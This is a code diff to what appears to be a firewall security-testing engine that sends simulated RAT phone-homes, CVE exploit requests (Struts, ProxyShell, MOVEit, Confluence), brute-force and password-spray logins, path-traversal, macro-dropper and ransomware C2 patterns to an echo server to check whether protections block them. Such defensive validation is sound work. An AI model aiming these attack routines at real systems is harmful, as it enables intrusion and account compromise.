 
@@ -2011,7 +2336,7 @@ class SecurityTestEngine:
 
         elif test.id == 'exfil_http_headers':
             parts = payload.split('|')
-            url = f'http://{host}:{http_port}/echo'
+            url = f'http://{host}:{http_port}/echo?payload=header-exfil-test'
             headers_dict = {
                 'X-Session-Data': parts[0] if len(parts) > 0 else '',
                 'X-Debug-Info': parts[1] if len(parts) > 1 else '',
@@ -2019,8 +2344,24 @@ class SecurityTestEngine:
             }
             try:
                 resp = requests.get(url, headers=headers_dict, timeout=10)
-                return self._analyze_response(test, resp, parts[0][:8] if parts else '',
-                    url=url, method='GET', sent_payload=payload)
+                # Sensitive data is in HTTP headers, not the body/URL.
+                # Echo server only echoes ?payload= ("header-exfil-test"), not headers.
+                # If firewall allows the request → HTTP 200 → FAIL.
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Block page detected for header data exfiltration',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — header data exfiltration blocked',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Sensitive data in HTTP headers passed through — Data Filtering did not inspect custom headers',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — header data not blocked',
+                    resp=resp, url=url, method='GET', sent_payload=payload)
             except (requests.ConnectionError, requests.Timeout, OSError) as e:
                 return self._blocked_result(test, f'Connection blocked: {e}',
                     url=url, method='GET', sent_payload=payload)
@@ -2097,22 +2438,25 @@ class SecurityTestEngine:
                     url=url, method='POST', sent_payload=payload)
 
         elif test.id == 'evasion_null_byte':
-            # Path traversal with null byte — send as raw URL path
+            # Path traversal with null byte — send via raw socket to preserve %00
             url = f'http://{host}:{http_port}/{payload}'
+            path_query = f'/{payload}'
             try:
-                resp = requests.get(url, timeout=10)
+                resp = _raw_http_get(host, http_port, path_query, timeout=10)
                 return self._analyze_response(test, resp, 'etc/passwd',
                     url=url, method='GET', sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, f'Connection blocked: {e}',
                     url=url, method='GET', sent_payload=payload)
 
         else:
             # evasion_double_encode, evasion_unicode, evasion_case_mixing, evasion_comment_insert
-            # Send payload as-is in query parameter (don't let requests re-encode)
+            # Send via raw socket to preserve exact encoding (requests would re-encode)
             url = f'http://{host}:{http_port}/echo?payload={payload}'
+            path_query = f'/echo?payload={payload}'
             try:
-                resp = requests.get(url, timeout=10)
+                resp = _raw_http_get(host, http_port, path_query, timeout=10)
                 # Check for SQL/XSS indicators in response
                 markers = ['UNION', 'SELECT', 'script', 'alert', 'passwd']
                 marker_found = any(m.lower() in (resp.text or '').lower() for m in markers)
@@ -2122,7 +2466,8 @@ class SecurityTestEngine:
                         resp=resp, url=url, method='GET', sent_payload=payload)
                 return self._analyze_response(test, resp, '',
                     url=url, method='GET', sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, f'Connection blocked: {e}',
                     url=url, method='GET', sent_payload=payload)
 
@@ -2334,6 +2679,530 @@ class SecurityTestEngine:
                     url=url, method='TLS', sent_payload=payload)
 
         return self._error_result(test, f'Unknown encrypted DNS test: {test.id}')
+
+    def _test_spyware_phonehome(self, test: SecurityTestCase, host: str,
+                                  http_port: int) -> SecurityTestResult:
+        """Test known RAT/spyware phone-home patterns against Anti-Spyware signatures."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'spy_gh0st':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = _raw_http_get(host, http_port,
+                    f'/echo?payload={payload}',
+                    extra_headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; Gh0st RAT client)',
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Gh0st RAT callback accepted — Anti-Spyware did not detect known RAT User-Agent and payload pattern',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — Gh0st RAT pattern blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected Gh0st RAT callback: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'spy_njrat':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = _raw_http_get(host, http_port,
+                    f'/echo?payload={payload}',
+                    extra_headers={
+                        'User-Agent': 'njRAT/0.7d',
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'njRAT phone-home accepted — Anti-Spyware did not detect njRAT User-Agent and connection pattern',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — njRAT pattern blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected njRAT phone-home: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'spy_darkcomet':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; DarkComet RAT)',
+                        'Content-Type': 'application/octet-stream',
+                    }, timeout=10)
+                if resp.status_code == 200 and 'DCDATA' in (resp.text or ''):
+                    return self._passthrough_result(test, resp.status_code,
+                        'DarkComet beacon accepted — Anti-Spyware did not detect DCDATA pipe-delimited C2 pattern',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, 'DCDATA',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected DarkComet beacon: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'spy_emotet':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Request-ID': 'emotet-c2-checkin',
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Emotet C2 check-in accepted — Anti-Spyware did not detect Emotet-style encoded POST with MSIE User-Agent',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, payload[:20],
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected Emotet C2 check-in: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown spyware phone-home test: {test.id}')
+
+    def _test_cve_exploit(self, test: SecurityTestCase, host: str,
+                           http_port: int) -> SecurityTestResult:
+        """Test specific CVE exploit patterns against Vulnerability Protection signatures."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'cve_spring4shell':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                    timeout=10)
+                return self._analyze_response(test, resp, 'classLoader',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Vulnerability Protection detected Spring4Shell (CVE-2022-22965): {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'cve_apache_struts':
+            # Payload is in Content-Type header — echo server won't echo it in body
+            url = f'http://{host}:{http_port}/echo?payload=test'
+            try:
+                resp = requests.get(url,
+                    headers={'Content-Type': payload}, timeout=10)
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Block page detected for Apache Struts exploit',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Apache Struts OGNL header blocked',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Apache Struts OGNL injection in Content-Type accepted — Vulnerability Protection did not detect CVE-2017-5638',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — Apache Struts exploit not blocked',
+                    resp=resp, url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Vulnerability Protection detected Apache Struts RCE (CVE-2017-5638): {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'cve_proxyshell':
+            url = f'http://{host}:{http_port}{payload}'
+            try:
+                resp = _raw_http_get(host, http_port, payload, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'ProxyShell autodiscover path traversal accepted — Vulnerability Protection did not detect CVE-2021-34473',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — ProxyShell exploit blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Vulnerability Protection detected ProxyShell (CVE-2021-34473): {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'cve_moveit':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-siLock-Transaction': 'folder_add_by_path',
+                    }, timeout=10)
+                # Payload in header + body — check both header detection and body echo
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Block page detected for MOVEit exploit',
+                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — MOVEit SQLi blocked',
+                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'MOVEit SQL injection accepted — Vulnerability Protection did not detect CVE-2023-34362 (X-siLock-Transaction header + SQL payload)',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — MOVEit exploit not blocked',
+                    resp=resp, url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Vulnerability Protection detected MOVEit SQLi (CVE-2023-34362): {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'cve_confluence':
+            path_query = f'/echo?payload={payload}'
+            url = f'http://{host}:{http_port}{path_query}'
+            try:
+                resp = _raw_http_get(host, http_port, path_query, timeout=10)
+                return self._analyze_response(test, resp, 'getRuntime',
+                    url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Vulnerability Protection detected Confluence OGNL injection (CVE-2022-26134): {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown CVE exploit test: {test.id}')
+
+    def _test_brute_force(self, test: SecurityTestCase, host: str,
+                           http_port: int) -> SecurityTestResult:
+        """Test brute-force detection by sending rapid sequential login attempts."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+        attempts = payload.split('|')
+        success_count = 0
+        total = len(attempts)
+
+        if test.id == 'bf_http_login':
+            url = f'http://{host}:{http_port}/login'
+            for pwd in attempts:
+                try:
+                    resp = requests.post(url, data={
+                        'username': 'admin@company.com', 'password': pwd.strip(),
+                    }, timeout=5)
+                    if resp.status_code == 200:
+                        success_count += 1
+                except (requests.ConnectionError, requests.Timeout, OSError):
+                    break
+            if success_count >= total:
+                return self._passthrough_result(test, 200,
+                    f'All {total} brute-force login attempts succeeded — no rate limiting or blocking detected. '
+                    'Configure Vulnerability Protection or Zone Protection brute-force settings',
+                    url=url, method='POST', sent_payload=f'{total} rapid login attempts')
+            return self._blocked_result(test,
+                f'Brute-force detected — {success_count}/{total} attempts succeeded before blocking',
+                url=url, method='POST', sent_payload=f'{total} rapid login attempts')
+
+        elif test.id == 'bf_basic_auth':
+            url = f'http://{host}:{http_port}/echo?payload=auth-test'
+            for cred in attempts:
+                try:
+                    import base64
+                    b64 = base64.b64encode(cred.strip().encode()).decode()
+                    resp = requests.get(url,
+                        headers={'Authorization': f'Basic {b64}'}, timeout=5)
+                    if resp.status_code == 200:
+                        success_count += 1
+                except (requests.ConnectionError, requests.Timeout, OSError):
+                    break
+            if success_count >= total:
+                return self._passthrough_result(test, 200,
+                    f'All {total} Basic Auth brute-force attempts succeeded — no detection. '
+                    'Configure brute-force protection for HTTP authentication',
+                    url=url, method='GET', sent_payload=f'{total} auth attempts')
+            return self._blocked_result(test,
+                f'Brute-force detected — {success_count}/{total} auth attempts succeeded before blocking',
+                url=url, method='GET', sent_payload=f'{total} auth attempts')
+
+        elif test.id == 'bf_password_spray':
+            url = f'http://{host}:{http_port}/login'
+            for cred in attempts:
+                parts = cred.strip().split(':', 1)
+                if len(parts) != 2:
+                    continue
+                try:
+                    resp = requests.post(url, data={
+                        'username': parts[0], 'password': parts[1],
+                    }, timeout=5)
+                    if resp.status_code == 200:
+                        success_count += 1
+                except (requests.ConnectionError, requests.Timeout, OSError):
+                    break
+            if success_count >= total:
+                return self._passthrough_result(test, 200,
+                    f'All {total} password spray attempts succeeded — no rate limiting detected. '
+                    'Configure Zone Protection with login detection',
+                    url=url, method='POST', sent_payload=f'{total} spray attempts')
+            return self._blocked_result(test,
+                f'Password spray detected — {success_count}/{total} attempts succeeded before blocking',
+                url=url, method='POST', sent_payload=f'{total} spray attempts')
+
+        return self._error_result(test, f'Unknown brute force test: {test.id}')
+
+    def _test_file_blocking(self, test: SecurityTestCase, host: str,
+                             http_port: int) -> SecurityTestResult:
+        """Test file blocking policy — download files that should be blocked by type."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+        url = f'http://{host}:{http_port}{payload}'
+
+        file_names = {
+            'fb_bat': 'test.bat', 'fb_ps1': 'test.ps1',
+            'fb_hta': 'test.hta', 'fb_jar': 'test.jar',
+        }
+        fname = file_names.get(test.id, 'unknown')
+
+        try:
+            resp = requests.get(url, timeout=10)
+            if self._is_block_page(resp):
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — File Blocking blocked {fname} download',
+                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=fname)
+            if resp.status_code in (403, 406, 502, 503, 504):
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — {fname} download blocked by File Blocking policy',
+                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=fname)
+            if resp.status_code == 200:
+                return self._passthrough_result(test, resp.status_code,
+                    f'{fname} downloaded successfully — File Blocking policy did not block this file type. '
+                    f'Add {fname.split(".")[-1].upper()} to the File Blocking profile',
+                    resp=resp, url=url, method='GET', sent_payload=fname)
+            return self._passthrough_result(test, resp.status_code,
+                f'HTTP {resp.status_code} — {fname} download not blocked',
+                resp=resp, url=url, method='GET', sent_payload=fname)
+        except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            return self._blocked_result(test,
+                f'Connection blocked — File Blocking prevented {fname} download: {e}',
+                url=url, method='GET', sent_payload=fname)
+
+    def _test_wildfire(self, test: SecurityTestCase, host: str,
+                        http_port: int) -> SecurityTestResult:
+        """Test WildFire sandbox analysis — send novel/suspicious files."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'wf_novel_pe':
+            url = f'http://{host}:{http_port}{payload}'
+            try:
+                resp = requests.get(url, timeout=10)
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — WildFire blocked suspicious PE download',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — PE with suspicious imports blocked',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Novel PE with suspicious imports (VirtualAllocEx, CreateRemoteThread) downloaded — '
+                        'WildFire should submit for sandbox analysis. Check WildFire profile and forwarding settings',
+                        resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — suspicious PE not blocked',
+                    resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — WildFire/AV prevented suspicious PE download: {e}',
+                    url=url, method='GET', sent_payload='suspicious.exe')
+
+        elif test.id == 'wf_macro_dropper':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'Content-Type': 'application/vnd.ms-word',
+                        'Content-Disposition': 'attachment; filename="invoice.doc"',
+                    }, timeout=10)
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — WildFire blocked macro dropper',
+                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload[:50])
+                if resp.status_code == 200 and 'AutoOpen' in (resp.text or ''):
+                    return self._passthrough_result(test, resp.status_code,
+                        'Macro dropper with PowerShell download cradle passed through — WildFire should analyze Office documents with macros',
+                        resp=resp, url=url, method='POST', sent_payload=payload[:50])
+                return self._analyze_response(test, resp, 'AutoOpen',
+                    url=url, method='POST', sent_payload=payload[:50])
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — WildFire detected macro dropper: {e}',
+                    url=url, method='POST', sent_payload=payload[:50])
+
+        elif test.id == 'wf_script_obfuscated':
+            url = f'http://{host}:{http_port}{payload}'
+            try:
+                resp = requests.get(url, timeout=10)
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — WildFire blocked obfuscated script',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — obfuscated VBScript blocked',
+                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Obfuscated VBScript with Chr() concatenation downloaded — WildFire should submit for dynamic analysis. '
+                        'Check WildFire profile includes script file types',
+                        resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — obfuscated script not blocked',
+                    resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — WildFire prevented obfuscated script download: {e}',
+                    url=url, method='GET', sent_payload='obfuscated.vbs')
+
+        return self._error_result(test, f'Unknown WildFire test: {test.id}')
+
+    def _test_cryptomining(self, test: SecurityTestCase, host: str,
+                            http_port: int) -> SecurityTestResult:
+        """Test cryptomining/cryptojacking detection patterns."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'crypto_coinhive':
+            url = f'http://{host}:{http_port}{payload}'
+            try:
+                resp = _raw_http_get(host, http_port, payload,
+                    extra_headers={
+                        'Upgrade': 'websocket',
+                        'Connection': 'Upgrade',
+                        'Sec-WebSocket-Protocol': 'coinhive',
+                        'Sec-WebSocket-Version': '13',
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Coinhive mining script request accepted — Anti-Spyware did not detect cryptocurrency mining pattern. '
+                        'Enable Anti-Spyware signatures for cryptocurrency miners',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — Coinhive mining pattern blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected Coinhive mining: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'crypto_stratum':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'xmrig/6.18.0',
+                    }, timeout=10)
+                if resp.status_code == 200 and 'mining.subscribe' in (resp.text or ''):
+                    return self._passthrough_result(test, resp.status_code,
+                        'Stratum mining protocol accepted — Anti-Spyware did not detect JSON-RPC mining.subscribe with XMRig identification',
+                        resp=resp, url=url, method='POST', sent_payload=payload)
+                return self._analyze_response(test, resp, 'mining.subscribe',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — Anti-Spyware detected Stratum mining protocol: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'crypto_pool_url':
+            url = f'http://{host}:{http_port}/echo?payload={payload}'
+            try:
+                resp = _raw_http_get(host, http_port,
+                    f'/echo?payload={payload}',
+                    extra_headers={
+                        'Host': payload,  # pool.minergate.com
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        f'Mining pool domain access ({payload}) not blocked — '
+                        'Enable URL Filtering to block cryptocurrency mining category',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — mining pool domain blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — URL Filtering detected mining pool domain: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown cryptomining test: {test.id}')
+
+    def _test_ransomware(self, test: SecurityTestCase, host: str,
+                          http_port: int) -> SecurityTestResult:
+        """Test ransomware detection patterns."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'ransom_note':
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={'Content-Type': 'text/plain'}, timeout=10)
+                if resp.status_code == 200 and 'ENCRYPTED' in (resp.text or '').upper():
+                    return self._passthrough_result(test, resp.status_code,
+                        'Ransomware note with Bitcoin wallet address passed through — '
+                        'Anti-Spyware or Data Filtering should detect ransom payment demands',
+                        resp=resp, url=url, method='POST', sent_payload=payload[:80])
+                return self._analyze_response(test, resp, 'ENCRYPTED',
+                    url=url, method='POST', sent_payload=payload[:80])
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — ransomware note content detected: {e}',
+                    url=url, method='POST', sent_payload=payload[:80])
+
+        elif test.id == 'ransom_c2_tor':
+            url = f'http://{host}:{http_port}/echo?payload=tor-c2-checkin'
+            try:
+                resp = _raw_http_get(host, http_port,
+                    '/echo?payload=tor-c2-checkin',
+                    extra_headers={
+                        'Host': 'k5zq47j6wd3wdvjq.onion',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0 TorBrowser/8.0',
+                        'X-Tor-Circuit': 'ransomware-c2',
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Ransomware Tor C2 request (.onion Host + TOR User-Agent) accepted — '
+                        'Anti-Spyware or URL Filtering should detect Tor hidden service access',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — Tor C2 pattern blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — ransomware Tor C2 pattern detected: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'ransom_wannacry':
+            url = f'http://{host}:{http_port}/echo?payload=wannacry-killswitch'
+            try:
+                resp = _raw_http_get(host, http_port,
+                    '/echo?payload=wannacry-killswitch',
+                    extra_headers={
+                        'Host': payload,  # iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
+                    }, timeout=10)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'WannaCry kill-switch domain access succeeded — '
+                        'Anti-Spyware should detect the characteristic WannaCry domain pattern',
+                        url=url, method='GET', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — WannaCry domain blocked',
+                    resp.status_code, url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection blocked — WannaCry ransomware pattern detected: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown ransomware test: {test.id}')
 
     # ─── Built-in Test Overrides ─────────────────────────────
 
